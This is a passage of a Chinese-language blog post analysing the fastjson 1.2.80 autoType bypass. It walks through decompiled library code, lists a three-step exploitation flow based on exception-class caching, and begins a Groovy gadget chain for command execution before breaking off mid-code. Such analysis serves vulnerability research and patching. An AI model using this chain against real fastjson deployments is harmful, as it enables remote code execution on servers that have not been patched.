class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//从map中获取类</span><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类不为空切目标类不为HashMap、LinkedHashMap且目标类不继承至期望类则抛出异常</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; clazz != LinkedHashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//以下与1.2.68基本一致</span><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                                    <span class="hljs-keyword">return</span> expectClass;<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var24) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.2.73中修改JavaBeanDeserializer#createInstance()方法，修改之前对类属性恢复的需要属性必须有Annotation，修改后类属性与显示指定的类不相同和拥有注解两者只需满足一个即可，而显示指定的类可以不传置为null</p><p><img src="/image/0ad2638f-0407-470d-9c2c-9384bb556be3.png" alt="image-20220922101838051"></p><p>实例化类属性后，fastjson就会将其加入到反序列化缓存TypeUtils.mappings中，之后对类反序列化时，就会从缓存中获取类</p><p>MiscCodec#deserialz()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<br>......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">currency</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currency&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (currency != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(currency);<br>                        &#125;<br><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">symbol</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currencyCode&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (symbol != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(symbol);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Map.Entry.class) &#123;<br>                        <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> jsonObject.toJavaObject(clazz);<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br>        ......<br></code></pre></td></tr></table></figure><p>JSONObject#toJavaObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">toJavaObject</span><span class="hljs-params">(Type type)</span> &#123;<br>    <span class="hljs-keyword">return</span> TypeUtils.cast(<span class="hljs-built_in">this</span>, type, ParserConfig.getGlobalInstance());<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#cast()</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">cast</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj, Type <span class="hljs-keyword">type</span>, ParserConfig mapping</span>) &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Class</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">Class</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ParameterizedType</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">ParameterizedType</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>) &#123;<br>            <span class="hljs-title class_">String</span> strVal = (<span class="hljs-title class_">String</span>)obj;<br>            <span class="hljs-keyword">if</span> (strVal.<span class="hljs-title function_">length</span>() == <span class="hljs-number">0</span> || <span class="hljs-string">&quot;null&quot;</span>.<span class="hljs-title function_">equals</span>(strVal) || <span class="hljs-string">&quot;NULL&quot;</span>.<span class="hljs-title function_">equals</span>(strVal)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">TypeVariable</span>) &#123;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span>Exception(<span class="hljs-string">&quot;can not cast to : &quot;</span> + <span class="hljs-keyword">type</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#catToJavaBen()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">castToJavaBean</span><span class="hljs-params">(Map&lt;String, Object&gt; map, Class&lt;T&gt; clazz, ParserConfig config)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String className;<br>        String language;<br>        <span class="hljs-keyword">if</span> (clazz == StackTraceElement.class) &#123;<br>......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> map.get(JSON.DEFAULT_TYPE_KEY);<span class="hljs-comment">//获取@type,故格式需为&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;xxxx.xxxxx&quot;</span><br>            <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                className = (String)arg0;<br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.global;<br>                &#125;<br><br>                Class&lt;?&gt; loadClazz = config.checkAutoType(className, (Class)<span class="hljs-literal">null</span>);<br>                <span class="hljs-keyword">if</span> (loadClazz == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(className + <span class="hljs-string">&quot; not found&quot;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (!loadClazz.equals(clazz)) &#123;<br>                    <span class="hljs-keyword">return</span> castToJavaBean(map, loadClazz, config);<br>                &#125;<br>            &#125;<br><br>            JSONObject jsonObject;<br>            ObjectDeserializer deserializer;<br>            <span class="hljs-keyword">if</span> (clazz.isInterface()) &#123;<br>                <span class="hljs-keyword">if</span> (map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    jsonObject = (JSONObject)map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.getGlobalInstance();<br>                &#125;<br><br>                deserializer = config.get(clazz);<br>                <span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>                    language = JSON.toJSONString(jsonObject);<br>                    <span class="hljs-keyword">return</span> JSON.parseObject(language, clazz);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, jsonObject);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                    arg0 = map.get(<span class="hljs-string">&quot;language&quot;</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">arg1</span> <span class="hljs-operator">=</span> map.get(<span class="hljs-string">&quot;country&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                        language = (String)arg0;<br>                        <span class="hljs-keyword">if</span> (arg1 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">country</span> <span class="hljs-operator">=</span> (String)arg1;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language, country);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (arg1 == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == String.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map.toString();<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSON.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz == LinkedHashMap.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                        jsonObject = (JSONObject)map;<br>                        Map&lt;String, Object&gt; innerMap = jsonObject.getInnerMap();<br>                        <span class="hljs-keyword">if</span> (innerMap <span class="hljs-keyword">instanceof</span> LinkedHashMap) &#123;<br>                            <span class="hljs-keyword">return</span> innerMap;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz.isInstance(map)) &#123;<br>                        <span class="hljs-keyword">return</span> map;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONObject.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                            config = ParserConfig.getGlobalInstance();<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanDeserializer</span> <span class="hljs-variable">javaBeanDeser</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        deserializer = config.getDeserializer(clazz);<br>                        <span class="hljs-keyword">if</span> (deserializer <span class="hljs-keyword">instanceof</span> JavaBeanDeserializer) &#123;<br>                            javaBeanDeser = (JavaBeanDeserializer)deserializer;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (javaBeanDeser == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;can not get javaBeanDeserializer. &quot;</span> + clazz.getName());<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">return</span> javaBeanDeser.createInstance(map, config);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(var8.getMessage(), var8);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用流程：</p><ol><li><p>指定显式期望类，实例化XXXException并被加入类缓存</p></li><li><p>通过XXXException中可控的属性名&#x2F;参数名，由隐式类间关系实例化并被加入类缓存</p></li><li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p></li></ol><h4 id="PAYLOAD-10"><a href="#PAYLOAD-10" class="headerlink" title="PAYLOAD:"></a>PAYLOAD:</h4><p>1.2.68及1.2.80版本均需要相应依赖库方可造成危害，漏洞危害大大减少，payload根据浅蓝师傅分享payload进行分析</p><h6 id="Gadget-groovy命令执行"><a href="#Gadget-groovy命令执行" class="headerlink" title="Gadget:groovy命令执行"></a>Gadget:groovy命令执行</h6><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用链分析：</p><p>org.codehaus.groovy.control.CompilationFailedException类继承Exction可通过校验，构造方法int phase, ProcessingUnit unit, Throwable cause三个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">CompilationFailedException</span><span class="hljs-params">(<span class="hljs-type">int</span> phase, ProcessingUnit unit, Throwable cause)</span> &#123;<br>    <span class="hljs-built_in">super</span>(Phases.getDescription(phase) + <span class="hljs-string">&quot; failed&quot;</span>, cause);<br>    <span class="hljs-built_in">this</span>.phase = phase;<br>    <span class="hljs-built_in">this</span>.unit = unit;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.control.ProcessingUnit类，setClassLoader()方法调用new GroovyClassLoader(parent, this.getConfiguration())</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessingUnit</span><span class="hljs-params">(CompilerConfiguration configuration, GroovyClassLoader classLoader, ErrorCollector errorCollector)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration != <span class="hljs-literal">null</span> ? configuration : CompilerConfiguration.DEFAULT);<br>    <span class="hljs-built_in">this</span>.setClassLoader(classLoader);<br>    <span class="hljs-built_in">this</span>.errorCollector = errorCollector != <span class="hljs-literal">null</span> ? errorCollector : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorCollector</span>(<span class="hljs-built_in">this</span>.getConfiguration());<br>    <span class="hljs-built_in">this</span>.configure(<span class="hljs-built_in">this</span>.getConfiguration());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> CompilerConfiguration <span class="hljs-title function_">getConfiguration</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.configuration;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title 